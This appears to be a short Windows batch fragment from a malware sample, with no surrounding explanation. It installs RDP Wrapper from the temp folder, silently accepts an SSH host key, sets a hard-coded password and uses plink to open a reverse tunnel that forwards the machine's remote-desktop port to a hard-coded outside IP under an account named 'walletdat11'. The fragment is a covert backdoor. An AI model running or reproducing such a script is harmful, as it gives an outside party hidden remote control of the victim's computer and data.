%temp%/rdpwinst.exe -i -o  

echo y | %temp%\plink.exe -ssh walletdat11@34.69.85.132 "exit" 
set "pwd=gjqhZca%%_1b(9!/" 

%temp%\plink.exe walletdat11@34.69.85.132 -pw %pwd% -P 22 -2 -4 -T -N -C -R 127.0.0.1:12345:127.0.0.1:3389 -batch 



